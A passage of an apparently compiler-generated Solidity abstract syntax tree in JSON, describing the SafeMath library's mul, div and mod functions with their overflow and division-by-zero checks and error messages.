												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 280,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "1760:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1737:50:2"
									},
									"returnParameters": {
										"id": 285,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 284,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 302,
												"src": "1811:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 283,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1811:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1810:9:2"
									},
									"scope": 424,
									"src": "1725:187:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 336,
										"nodeType": "Block",
										"src": "2219:392:2",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 314,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 312,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 305,
														"src": "2451:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 313,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "2456:1:2",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "2451:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 318,
												"nodeType": "IfStatement",
												"src": "2447:45:2",
												"trueBody": {
													"id": 317,
													"nodeType": "Block",
													"src": "2459:33:2",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 315,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2480:1:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"functionReturnParameters": 311,
															"id": 316,
															"nodeType": "Return",
															"src": "2473:8:2"
														}
													]
												}
											},
											{
												"assignments": [
													320
												],
												"declarations": [
													{
														"constant": false,
														"id": 320,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 336,
														"src": "2502:9:2",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 319,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "2502:7:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 324,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 323,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 321,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 305,
														"src": "2514:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "*",
													"rightExpression": {
														"argumentTypes": null,
														"id": 322,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 307,
														"src": "2518:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2514:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2502:17:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 330,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 328,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 326,
																	"name": "c",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 320,
																	"src": "2537:1:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 327,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 305,
																	"src": "2541:1:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "2537:5:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"id": 329,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 307,
																"src": "2546:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "2537:10:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f77",
															"id": 331,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2549:35:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_9113bb53c2876a3805b2c9242029423fc540a728243ce887ab24c82cf119fba3",
																"typeString": "literal_string \"SafeMath: multiplication overflow\""
															},
															"value": "SafeMath: multiplication overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_9113bb53c2876a3805b2c9242029423fc540a728243ce887ab24c82cf119fba3",
																"typeString": "literal_string \"SafeMath: multiplication overflow\""
															}
														],
														"id": 325,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "2529:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 332,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2529:56:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 333,
												"nodeType": "ExpressionStatement",
												"src": "2529:56:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 334,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 320,
													"src": "2603:1:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 311,
												"id": 335,
												"nodeType": "Return",
												"src": "2596:8:2"
											}
										]
									},
									"documentation": {
										"id": 303,
										"nodeType": "StructuredDocumentation",
										"src": "1918:229:2",
										"text": " @dev Returns the multiplication of two unsigned integers, reverting on\n overflow.\n Counterpart to Solidity's `*` operator.\n Requirements:\n - Multiplication cannot overflow."
									},
									"id": 337,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mul",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 308,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 305,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 337,
												"src": "2165:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 304,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2165:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 307,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 337,
												"src": "2176:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 306,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2176:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2164:22:2"
									},
									"returnParameters": {
										"id": 311,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 310,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 337,
												"src": "2210:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 309,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2210:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2209:9:2"
									},
									"scope": 424,
									"src": "2152:459:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 353,
										"nodeType": "Block",
										"src": "3133:63:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 348,
															"name": "a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 340,
															"src": "3154:1:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 349,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 342,
															"src": "3157:1:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206469766973696f6e206279207a65726f",
															"id": 350,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3160:28:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_5b7cc70dda4dc2143e5adb63bd5d1f349504f461dbdfd9bc76fac1f8ca6d019f",
																"typeString": "literal_string \"SafeMath: division by zero\""
															},
															"value": "SafeMath: division by zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_stringliteral_5b7cc70dda4dc2143e5adb63bd5d1f349504f461dbdfd9bc76fac1f8ca6d019f",
																"typeString": "literal_string \"SafeMath: division by zero\""
															}
														],
														"id": 347,
														"name": "div",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															354,
															382
														],
														"referencedDeclaration": 382,
														"src": "3150:3:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$_t_string_memory_ptr_$returns$_t_uint256_$",
															"typeString": "function (uint256,uint256,string memory) pure returns (uint256)"
														}
													},
													"id": 351,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3150:39:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 346,
												"id": 352,
												"nodeType": "Return",
												"src": "3143:46:2"
											}
										]
									},
									"documentation": {
										"id": 338,
										"nodeType": "StructuredDocumentation",
										"src": "2617:444:2",
										"text": " @dev Returns the integer division of two unsigned integers. Reverts on\n division by zero. The result is rounded towards zero.\n Counterpart to Solidity's `/` operator. Note: this function uses a\n `revert` opcode (which leaves remaining gas untouched) while Solidity\n uses an invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 354,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 343,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 340,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 354,
												"src": "3079:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 339,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3079:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 342,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 354,
												"src": "3090:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 341,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3090:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3078:22:2"
									},
									"returnParameters": {
										"id": 346,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 345,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 354,
												"src": "3124:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 344,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3124:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3123:9:2"
									},
									"scope": 424,
									"src": "3066:130:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 381,
										"nodeType": "Block",
										"src": "3766:243:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 369,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 367,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 359,
																"src": "3850:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 368,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "3854:1:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "3850:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 370,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 361,
															"src": "3857:12:2",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 366,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "3842:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 371,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3842:28:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 372,
												"nodeType": "ExpressionStatement",
												"src": "3842:28:2"
											},
											{
												"assignments": [
													374
												],
												"declarations": [
													{
														"constant": false,
														"id": 374,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 381,
														"src": "3880:9:2",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 373,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "3880:7:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 378,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 377,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 375,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 357,
														"src": "3892:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"id": 376,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 359,
														"src": "3896:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3892:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3880:17:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 379,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 374,
													"src": "4001:1:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 365,
												"id": 380,
												"nodeType": "Return",
												"src": "3994:8:2"
											}
										]
									},
									"documentation": {
										"id": 355,
										"nodeType": "StructuredDocumentation",
										"src": "3202:464:2",
										"text": " @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n division by zero. The result is rounded towards zero.\n Counterpart to Solidity's `/` operator. Note: this function uses a\n `revert` opcode (which leaves remaining gas untouched) while Solidity\n uses an invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 382,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 362,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 357,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 382,
												"src": "3684:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 356,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3684:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 359,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 382,
												"src": "3695:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 358,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3695:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 361,
												"mutability": "mutable",
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 382,
												"src": "3706:26:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 360,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "3706:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3683:50:2"
									},
									"returnParameters": {
										"id": 365,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 364,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 382,
												"src": "3757:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 363,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3757:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3756:9:2"
									},
									"scope": 424,
									"src": "3671:338:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 398,
										"nodeType": "Block",
										"src": "4520:61:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 393,
															"name": "a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 385,
															"src": "4541:1:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 394,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 387,
															"src": "4544:1:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206d6f64756c6f206279207a65726f",
															"id": 395,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4547:26:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_726e51f7b81fce0a68f5f214f445e275313b20b1633f08ce954ee39abf8d7832",
																"typeString": "literal_string \"SafeMath: modulo by zero\""
															},
															"value": "SafeMath: modulo by zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_stringliteral_726e51f7b81fce0a68f5f214f445e275313b20b1633f08ce954ee39abf8d7832",
																"typeString": "literal_string \"SafeMath: modulo by zero\""
															}
														],
														"id": 392,
														"name": "mod",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															399,
															423
														],
														"referencedDeclaration": 423,
														"src": "4537:3:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$_t_string_memory_ptr_$returns$_t_uint256_$",
															"typeString": "function (uint256,uint256,string memory) pure returns (uint256)"
														}
													},
													"id": 396,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4537:37:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 391,
												"id": 397,
												"nodeType": "Return",
												"src": "4530:44:2"
											}
										]
									},
									"documentation": {
										"id": 383,
										"nodeType": "StructuredDocumentation",
										"src": "4015:433:2",
										"text": " @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n Reverts when dividing by zero.\n Counterpart to Solidity's `%` operator. This function uses a `revert`\n opcode (which leaves remaining gas untouched) while Solidity uses an\n invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 399,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 388,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 385,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 399,
												"src": "4466:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 384,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4466:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 387,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 399,
												"src": "4477:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 386,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4477:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4465:22:2"
									},
									"returnParameters": {
										"id": 391,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 390,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 399,
												"src": "4511:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 389,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4511:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4510:9:2"
									},
									"scope": 424,
									"src": "4453:128:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 422,
										"nodeType": "Block",
										"src": "5140:68:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 414,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 412,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 404,
																"src": "5158:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 413,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "5163:1:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "5158:6:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
